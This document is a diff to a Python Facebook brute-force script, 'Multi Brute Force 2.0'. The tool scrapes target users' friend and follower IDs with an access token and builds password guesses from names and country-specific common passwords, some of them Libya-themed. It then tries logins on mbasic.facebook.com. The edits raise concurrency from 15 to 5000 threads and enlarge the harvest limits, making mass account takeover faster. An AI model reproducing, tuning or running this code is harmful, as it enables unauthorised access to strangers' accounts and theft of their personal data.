@@ -33,7 +33,7 @@ else:
 ### HEADERS ###
 
 def banner():
-    print("""\x1b[0;37m   ___                   \n  / _ \_______             ® \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 2.0  │  Script By Ahmed  Alzwage       │\n       /  ^ \/ / // /  ^ \   │•• Github.com/ahmedalzwage ••    │\n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘""")
+    print("""\x1b[0;37m   ___                   \n  / _ \_______             ® \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 2.0  │  Script By Ahmed  Alzwage      │\n       /  ^ \/ / // /  ^ \   │•• Github.com/ahmedalzwage ••   │\n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘""")
 
 host="https://mbasic.facebook.com"
 ips=None
@@ -114,10 +114,10 @@ def country():
     os.system("clear")
     banner()
     print("\n%s[%s Choose Country %s]\n"%(k,p,k))
-    print("%s[%s1%s] %sIndonesia"%(k,p,k,p))
-    print("%s[%s2%s] %sBangladesh/India"%(k,p,k,p))
-    print("%s[%s3%s] %sPakistan"%(k,p,k,p))
-    print("%s[%s4%s] %sUSA"%(k,p,k,p))
+    print("%s[%s1%s] %sAA"%(k,p,k,p))
+    print("%s[%s2%s] %s/BB"%(k,p,k,p))
+    print("%s[%s3%s] %sCC"%(k,p,k,p))
+    print("%s[%s4%s] %sDD"%(k,p,k,p))
     choose_country()
     
 def choose_country():
@@ -126,7 +126,7 @@ def choose_country():
         print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
     elif cc in["1","01"]:
         os.system("rm -rf country.txt")
-        cou = "id"
+        cou = "A"
         try:
             ctry = open('country.txt','w')
             ctry.write(cou)
@@ -136,7 +136,7 @@ def choose_country():
             menu()
     elif cc in["2","02"]:
         os.system("rm -rf country.txt")
-        cou = "bd"
+        cou = "B"
         try:
             ctry = open('country.txt','w')
             ctry.write(cou)
@@ -146,7 +146,7 @@ def choose_country():
             menu()
     elif cc in["3","03"]:
         os.system("rm -rf country.txt")
-        cou = "pk"
+        cou = "C"
         try:
             ctry = open('country.txt','w')
             ctry.write(cou)
@@ -156,7 +156,7 @@ def choose_country():
             menu()
     elif cc in["4","04"]:
         os.system("rm -rf country.txt")
-        cou = "us"
+        cou = "D"
         try:
             ctry = open('country.txt','w')
             ctry.write(cou)
@@ -273,13 +273,13 @@ def menu():
     ip = requests.get("https://api.ipify.org").text
     ngr = open('country.txt', 'r').read()
     if "id" in ngr:
-        negara = "Indonesia"
+        negara = "AA"
     elif "bd" in ngr:
-        negara = "Bangladesh/India"
+        negara = "BB"
     elif "pk" in ngr:
-        negara = "Pakistan"
+        negara = "CC"
     elif "us" in ngr:
-        negara = "USA"
+        negara = "DD"
     os.system("clear")
     banner()
     print((k+"\n[ "+p+"Welcome "+a["name"]+k+" ]"+p))
@@ -375,7 +375,7 @@ def publik():
 			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
 			print((k+"\n[ "+p+"Back"+k+" ]"+p))
 			publik()
-		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit=10000&access_token="+toket)
+		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit=50000&access_token="+toket)
 		id = []
 		z=json.loads(r.text)
 		qq = (op["first_name"]+".json").replace(" ","_")
@@ -406,7 +406,7 @@ def follow():
 			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
 			print((k+"\n[ "+p+"Back"+k+" ]"+p))
 			publik()
-		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=99999&access_token="+toket)
+		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+toket)
 		id = []
 		z=json.loads(r.text)
 		qq = (op["first_name"]+".json").replace(" ","_")
@@ -463,7 +463,7 @@ def random_numbers():
   jml=int(input(k+"["+p+"•"+k+"]"+p+" Amount : "))
   [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,7)]) for e in range(jml)]]
   print(k+"\n["+p+"•"+k+"]"+p+" Crack Started, Please Wait...\n")
-  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
+  with concurrent.futures.ThreadPoolExecutor(max_workers=5000) as th:
     {th.submit(brute, user['user'], user['pw']): user for user in data}
   input(k+"\n[ "+p+"Back"+k+" ]"+p)
   menu()
@@ -559,7 +559,7 @@ def target():
 			except KeyError:
 				print((k+"["+p+"•"+k+"]"+p+" Total Friend     : -"))
 			try:
-				a=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
+				a=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=50000&access_token="+toket)
 				id = []
 				b = json.loads(a.text)
 				bb = (op["first_name"]+".json").replace(" ","_")
@@ -612,14 +612,14 @@ def generate(text):
 				results.append(i+"123")
 				results.append(i+"12345")
 				results.append(i)
-				if "id" in ct:
+				if "AA" in ct:
 					results.append("libya123")
-				elif "bd" in ct:
+				elif "BB" in ct:
 					results.append("009988009988")
 					results.append("098098")
 					results.append("00998877")
 					results.append("009988")
-				elif "pk" in ct:
+				elif "CC" in ct:
 					results.append("19981998")
 					results.append("19991999")
 					results.append("20002000")
@@ -627,7 +627,7 @@ def generate(text):
 					results.append("20022002")
 					results.append("20032003")
 					results.append("20042004")
-				elif "us" in ct:
+				elif "DD" in ct:
 					results.append("1234512345")
 					results.append("1020304050")
 					results.append("1122334455")
@@ -707,7 +707,7 @@ def check_ugent():
 def mbasic(em,pas,hosts):
 	ua = open('ugent.txt', 'r').read()
 	r=requests.Session()
-	r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+	r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"ar-AR;q=0.9,en-US;q=0.8,en;q=0.7"})
 	p=r.get("https://mbasic.facebook.com/")
 	b=bs4.BeautifulSoup(p.text,"html.parser")
 	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
@@ -773,11 +773,11 @@ class crack:
 		self.ada=[]
 		self.cp=[]
 		self.ko=0
-		print((k+"\n["+p+"•"+k+"]"+p+" Crack With Pass Default/Manual [d/m]"))
+		print((k+"\n["+p+"•"+k+"]"+p+" Crack With Pass Default/Manual [y/t]"))
 		while True:
 			f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
 			if f=="":continue
-			elif f=="m":
+			elif f=="y":
 				try:
 					while True:
 						try:
@@ -798,7 +798,7 @@ class crack:
 				print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
 				self.pwlist()
 				break
-			elif f=="d":
+			elif f=="t":
 				try:
 					while True:
 						try:
@@ -862,11 +862,11 @@ class crackttl:
 		self.ada=[]
 		self.cp=[]
 		self.ko=0
-		print((k+"\n["+p+"•"+k+"]"+p+" Crack With Pass Default/Manual [d/m]"))
+		print((k+"\n["+p+"•"+k+"]"+p+" Crack With Pass Default/Manual [y/t]"))
 		while True:
 			f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
 			if f=="":continue
-			elif f=="m":
+			elif f=="y":
 				try:
 					while True:
 						try:
@@ -884,10 +884,10 @@ class crackttl:
 				except Exception as e:
 					print(("   %s"%e))
 					continue
-				print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
+				print((k+"["+p+"•"+k+"]"+p+" Example : libya,libya123,123456"))
 				self.pwlist()
 				break
-			elif f=="d":
+			elif f=="t":
 				try:
 					while True:
 						try:
@@ -959,11 +959,11 @@ class crackffb:
 		self.ada=[]
 		self.cp=[]
 		self.ko=0
-		print((k+"\n["+p+"•"+k+"]"+p+" Crack With Pass Default/Manual [d/m]"))
+		print((k+"\n["+p+"•"+k+"]"+p+" Crack With Pass Default/Manual [y/t]"))
 		while True:
 			f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
 			if f=="":continue
-			elif f=="m":
+			elif f=="t":
 				try:
 					while True:
 						try:
@@ -981,10 +981,10 @@ class crackffb:
 				except Exception as e:
 					print(("   %s"%e))
 					continue
-				print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
+				print((k+"["+p+"•"+k+"]"+p+" Example : libya,libya123,123456"))
 				self.pwlist()
 				break
-			elif f=="d":
+			elif f=="y":
 				try:
 					while True:
 						try:
@@ -1176,7 +1176,7 @@ class bapittl:
               print((k+"["+p+"!"+k+"]"+p+" %s"%e))
               continue
           self.fl=[]
-          print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
+          print((k+"["+p+"•"+k+"]"+p+" Example : 20002000,libya123,1234554321"))
           self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
           if len(self.pw) ==0:
             continue
